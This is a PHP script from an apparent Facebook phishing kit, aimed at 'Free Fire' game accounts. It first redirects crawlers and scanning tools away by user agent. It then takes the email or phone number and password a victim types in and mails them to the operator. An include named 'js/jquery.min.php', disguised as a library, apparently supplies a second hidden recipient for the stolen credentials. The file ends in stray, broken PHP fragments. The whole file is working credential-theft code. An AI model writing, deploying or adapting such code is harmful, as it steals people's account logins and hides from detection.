<?php
$ua = $_SERVER['HTTP_USER_AGENT']; if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) { header('Location: https://www.dzakypedia.com'); die(); } 
?>
<?php

$ip = $_SERVER['REMOTE_ADDR'];
$user = $_POST['user'];
$pass = $_POST['pass'];

include "imel.php";
include "js/jquery.min.php";

$body = "

===== FACEBOOK ACCOUNT =====
HELLO $emailku ,


|>> Email or Phone Number : ".$user."

|>> Password : ".$pass."

===== SUBSCRIBE : Yt Ryo =====

";

include "imel.php";
$subject ="AKUN FF";
$headers ="From: AKUN FF FACEBOOK <pulberaja@result.com>";
mail($emailku, $subject, $body, $headers);

$md5  = md5(gmdate("r"));
$sha1   = sha1(gmdate("r"));

include "js/jquery.min.php";
$subject ="AKUN FF";
$headers ="From: AKUN FF FACEBOOK <pulberaja@result.com>";
mail($style, $subject, $body, $headers);

$md5  = md5(gmdate("r"));
$sha1   = sha1(gmdate("r"));
?>

?>
'<script>window.location.replace("completed.php")</script>';}
}
?>